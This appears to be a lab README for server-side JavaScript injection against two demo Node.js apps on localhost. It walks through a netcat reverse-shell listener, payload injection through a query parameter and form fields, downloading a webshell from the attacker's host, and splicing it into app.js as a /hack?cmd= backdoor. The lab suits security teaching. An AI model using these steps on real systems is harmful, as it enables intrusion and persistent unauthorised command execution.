<h1 align="center">1 Initial Stage</h2>

## 1.1) Start a Netcat Listener
Before performing the attack, the hacker machine must host a web server. Which will listen for [reverse tcp](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/) connections, the following example uses [openbsd-netcat](https://man.openbsd.org/nc.1): 
```
nc -lvnp 8000
```

## 1.2.1) Injecting payload into Simple SSJI Web App
### Method 1 - Copy Paste
Copy the contents of the [revshell.js](./revshell.js) file.
```
# Windows
type payload\revshell.js | clip

# Linux
xclip -in payload/revshell.js -selection clipboard
```
And paste the contents of [revshell.js](revshell.js) into the `year` HTTP GET Query
```
curl -G --data-urlencode "year=<payload>" http://localhost:3000
```
### Method 2 - Server/Client
Host a server from the `payload` directory and use cURL to inject the payload
#### Step 1 - Host the Web Server
```
php -S 0.0.0.0:5000
----- OR -----
python -m http.server 5000
```
#### Step 2 - Curl the output and inject
```
curl -G --data-urlencode "year=$(curl -s http://localhost:5000/revshell.js)" http://localhost:3000
```

## 1.2.2) Injecting payload into The Cutlery Shop App
Using the form fields of the application, you can perform a string escape on the `Name` field.
```
Name: " + <payload> + "
Price: 100
```
Alternatively, you can simply paste the payload into the `Price` field, since it does not take a string input.
```
Name: Butter Knife
Price: <payload> 
```

## 1.3) Result
If successful, the hacker machine will receive a signal and socket output similar to what is shown below:
```
% nc -lnvp 8000
Listening on 0.0.0.0 8000
Connection received on 127.0.0.1 44598
$ ls
README.md
app.js
node_modules
package-lock.json
package.json
public
views
```

<h1 align="center">2 Persistence Stage</h2>

## 2.1 Webshell Backdoor
Since our reverse shell is only a temporary foothold in the system, we can introduce a simple backdoor. So that we can access this system in the future and gain persistence.

The [webshell.js](webshell.js) file contains a snippet of code prepared in advance, which adds a webshell to the main NodeJS application.

## 2.2 Creating Webshell File
It is slightly inconvenient to create text files with very specific contents from a primitive reverse shell. Here are some of the techniques which I use to create malicious files on the server.

### Method 1 - Cat Command
Using the `cat` linux command, create a file on the victim's server. By manually typing or pasting the contents of [webshell.js](./webshell.js) file excluding the `...` like so:
```
cat > notavirus.js <<EOF
... PASTE PAYLOAD HERE ...
EOF
```
__Note:__ Typing EOF will end the command make sure to paste the code before typing EOF at the end.

### Method 2 - File Download
Host a web server and use the reverse shell to download it on the victim's machine.
```
(hacker) $ php -S 0.0.0.0:5000
(victim) $ curl -O http://<hacker-ip>:5000/webshell.js
----- OR -----
(hacker) $ python -m http.server 5000
(victim) $ curl -O http://<hacker-ip>:5000/webshell.js
```

## 2.3 Editing Important Files
The most important file on the either web applications is the __app.js__ file. Because it contains all the routes to the frontend pages, but in a real scenario, files of interests may vary. 

Here are two methods of editing files without the help of popular command line text editors such as [vim](https://www.vim.org/) or [nano](https://www.nano-editor.org/).

### Method 1 - Sed (Stream Editor)
Using [GNU sed](https://en.wikipedia.org/wiki/Sed) we can output the contents of [webshell.js](./webshell.js) on a specific line number in the __app.js__ file. The following will tell `sed` to go to line 39 before the `app.listen()` call, and READ the contents of [webshell.js](./webshell.js) into it.
```
sed -i "39r webshell.js" app.js
```

### Method 2 - Ed (Line Editor)
[GNU ed](https://en.wikipedia.org/wiki/Ed_(text_editor)) is also a viable alternative to output the contents of webshell payload to the appropriate line number.

But unlike `sed` which is utilised for automated scripts to modify configuration files, `ed` is developed by Ken Thompson for human-centric usage on paper roll terminals back in August 1969.
```
ed -s app.js <<EOF
39r webshell.js
w
q
EOF
```

## Using The Backdoor

The payload will spawn a webshell which you can access from the `/hack` route in `http://localhost:3000`. Commands can be executed by appending them in front of the `cmd` HTTP GET Query.

### With cURL
```
# Usage
curl -G --data-urlencode "cmd=<command>" http://localhost:3000/hack

# Example
curl -G --data-urlencode "cmd=cat /etc/*-release" http://localhost:3000/hack
```

### With A Browser
```
# Usage
http://localhost:3000/hack?cmd=<command>

# Example
http://localhost:3000/hack?cmd=cat /etc/*-release
```
